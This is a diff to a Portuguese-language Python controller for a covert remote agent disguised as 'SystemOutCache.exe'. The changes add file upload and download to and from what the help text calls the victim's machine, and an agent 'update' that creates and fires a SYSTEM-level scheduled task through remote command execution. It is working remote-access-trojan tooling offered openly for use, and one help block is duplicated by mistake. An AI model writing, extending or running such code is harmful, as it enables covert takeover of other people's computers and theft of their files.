@@ -40,6 +40,114 @@ def test_connection(host, port):
     except:
         return False
 
+
+
+# ==============================================================================
+# FILE TRANSFER HELPERS (PORT 7723)
+# ==============================================================================
+import struct
+import os
+
+def transfer_file_put(host, local_path, remote_path=None):
+    """Envia arquivo para o servidor"""
+    port = 7723
+    if not os.path.exists(local_path):
+        return "[ERRO] Arquivo local não encontrado."
+    
+    if not remote_path:
+        remote_path = os.path.basename(local_path)
+
+    try:
+        file_size = os.path.getsize(local_path)
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(10)
+            s.connect((host, port))
+            
+            # 1. Envia Header
+            header = f"UPLOAD:{remote_path}"
+            # Pad a header to 1024 bytes or just send it raw? Server reads 1024.
+            # Server does: header_data = client.recv(1024).decode(...).strip()
+            # If we send less, recv might block until it gets more or connection closes?
+            # Wait, recv(1024) returns *up to* 1024. But if we send small packet, it returns fast.
+            s.sendall(header.encode('utf-8'))
+            
+            # 2. Espera OK
+            ack = s.recv(1024).decode()
+            if ack != "OK":
+                return f"[ERRO] Servidor recusou upload: {ack}"
+            
+            # 3. Envia Tamanho
+            s.sendall(struct.pack('>I', file_size))
+            
+            # 4. Envia Payload com Barra de Progresso
+            print(f"[UPLOAD] Enviando {local_path} ({file_size} bytes)...")
+            sent = 0
+            with open(local_path, 'rb') as f:
+                while sent < file_size:
+                    chunk = f.read(4096)
+                    if not chunk: break
+                    s.sendall(chunk)
+                    sent += len(chunk)
+                    # Simple progress
+                    if file_size > 1024*1024:
+                        print(f"\rProgresso: {sent*100//file_size}%", end='')
+            
+            if file_size > 1024*1024: print() # Newline
+            
+            # 5. Espera Confirmação Final
+            final_ack = s.recv(1024).decode()
+            return f"[SUCESSO] Upload concluído: {final_ack}"
+
+    except Exception as e:
+        return f"[ERRO] Falha no Upload: {e}"
+
+def transfer_file_get(host, remote_path, local_path=None):
+    """Baixa arquivo do servidor"""
+    port = 7723
+    if not local_path:
+        local_path = os.path.basename(remote_path)
+        # Se for a pasta raiz UPLOAD, salva como .zip
+        if local_path.upper() == 'UPLOAD':
+            local_path += '.zip'
+        
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(10)
+            s.connect((host, port))
+            
+            # 1. Envia Header
+            header = f"DOWNLOAD:{remote_path}"
+            s.sendall(header.encode('utf-8'))
+            
+            # 2. Espera OK + Tamanho
+            resp = s.recv(2) # "OK"
+            if resp != b"OK":
+                return f"[ERRO] Arquivo remoto não encontrado ou erro no servidor."
+            
+            size_data = s.recv(4)
+            file_size = struct.unpack('>I', size_data)[0]
+            
+            print(f"[DOWNLOAD] Baixando {remote_path} ({file_size} bytes)...")
+            
+            # 3. Recebe Payload
+            received = 0
+            with open(local_path, 'wb') as f:
+                while received < file_size:
+                    chunk_size = min(4096, file_size - received)
+                    data = s.recv(chunk_size)
+                    if not data: break
+                    f.write(data)
+                    received += len(data)
+                    # Simple progress
+                    if file_size > 1024*1024:
+                        print(f"\rProgresso: {received*100//file_size}%", end='')
+            
+            if file_size > 1024*1024: print()
+            return f"[SUCESSO] Download salvo em: {local_path}"
+
+    except Exception as e:
+        return f"[ERRO] Falha no Download: {e}"
+
 # ==============================================================================
 # INTERACTIVE SHELL
 # ==============================================================================
@@ -97,6 +205,41 @@ def start_shell(host, port, command):
     
     input("Pressione ENTER para voltar ao console...")
 
+def perform_update(host):
+    """Realiza o update automático do agente"""
+    print("\nXXX ATUALIZAÇÃO AUTOMÁTICA DO AGENTE XXX")
+    print("Certifique-se que o novo 'SystemOutCache.exe' está nesta pasta.")
+    
+    if not os.path.exists("SystemOutCache.exe"):
+        print("[ERRO] SystemOutCache.exe não encontrado localmente.")
+        return
+        
+    confirm = input("Confirmar atualização e reinício do serviço remoto? (S/N): ")
+    if confirm.upper() != 'S': return
+
+    print("\n[1/2] Enviando novo executável...")
+    if "SUCCESS" not in transfer_file_put(host, "SystemOutCache.exe"):
+         return
+         
+    print("\n[2/2] Executando Update Remoto (Via Scheduler)...")
+    
+    # Truque do Scheduler para evitar que o script morra quando o serviço parar
+    # Agendamos o Update.bat que JÁ EXISTE na raiz (C:\Windows\SystemOut\Update.bat)
+    
+    # 1. Cria a tarefa (Executa como SYSTEM)
+    cmd_create = r'schtasks /Create /F /SC ONCE /ST 00:00 /TN "SystemUpdate" /TR "cmd.exe /c C:\Windows\SystemOut\Update.bat" /RL HIGHEST /RU SYSTEM'
+    print(f"Criando tarefa: {send_command(host, 7722, 'EXEC:' + cmd_create)}")
+    
+    # 2. Executa a tarefa
+    cmd_run = r'schtasks /Run /TN "SystemUpdate"'
+    resp = send_command(host, 7722, 'EXEC:' + cmd_run)
+    print(f"Disparando tarefa: {resp}")
+    
+    print("\n[INFO] Update agendado e disparado.")
+    print("A conexão vai cair. O script 'SystemUpdate' vai parar o serviço e trocar o executável.")
+    print("Aguarde 30s e tente reconectar.")
+    input("Pressione ENTER para voltar...")
+
 # ==============================================================================
 # MENUS & UI
 # ==============================================================================
@@ -130,7 +273,16 @@ def print_help():
     print("\n  START:VISIBLE:<comando>  -> Abre na TELA DA VÍTIMA (Sessão 1).")
     print("                              Ex: START:VISIBLE:chrome.exe")
 
-    print("\n[2] GERENCIAMENTO DE PROCESSOS")
+    print("\n  START:VISIBLE:<comando>  -> Abre na TELA DA VÍTIMA (Sessão 1).")
+    print("                              Ex: START:VISIBLE:chrome.exe")
+
+    print("\n[2] TRANSFERÊNCIA DE ARQUIVOS (PORTA 7723)")
+    print("-" * 80)
+    print("  PUT <nome do arquivo>            -> Envia arquivo local para a vítima (Pasta UPLOAD).")
+    print("  GET <nome do arquivo>            -> Baixa arquivo da vítima.")
+    print("  GET UPLOAD               -> Baixa TODA a pasta UPLOAD zipada.")
+
+    print("\n[3] GERENCIAMENTO DE PROCESSOS")
     print("-" * 80)
     print("  LIST                     -> Lista processos iniciados pelo Agente.")
     print("  STOP:<id>                -> Para o processo pelo ID da lista.")
@@ -183,6 +335,29 @@ def command_console(host):
                     print("Erro: Digite o comando. Ex: SHELL:cmd.exe")
                 continue
 
+            # --- FILE TRANSFER MODE (PUT/GET) ---
+            if cmd.upper().startswith("PUT "):
+                # Sintaxe: PUT local [remote]
+                parts = cmd.split()
+                if len(parts) < 2:
+                    print("Uso: PUT <arquivo_local> [nome_remoto]")
+                    continue
+                local_f = parts[1]
+                remote_f = parts[2] if len(parts) > 2 else None
+                print(transfer_file_put(host, local_f, remote_f))
+                continue
+
+            if cmd.upper().startswith("GET "):
+                # Sintaxe: GET remote [local]
+                parts = cmd.split()
+                if len(parts) < 2:
+                    print("Uso: GET <arquivo_remoto> [nome_local]")
+                    continue
+                remote_f = parts[1]
+                local_f = parts[2] if len(parts) > 2 else None
+                print(transfer_file_get(host, remote_f, local_f))
+                continue
+
             # --- STANDARD COMMAND ---
             start_t = time.time()
             resp = send_command(host, PORT, cmd)
@@ -221,6 +396,9 @@ def main():
         else:
             print("2 - Console de Comandos (Requer Conexão)")
         print("3 - Ajuda / Explicação dos Comandos")
+
+        if current_host:
+            print("5 - ATUALIZAR AGENTE (Upload + Restart)")
         print("4 - Sair")
         print("-" * 60)
         
@@ -248,6 +426,9 @@ def main():
 
         elif opt == '3':
             print_help()
+            
+        elif opt == '5' and current_host:
+            perform_update(current_host)
 
         elif opt == '4':
             print("Saindo...")
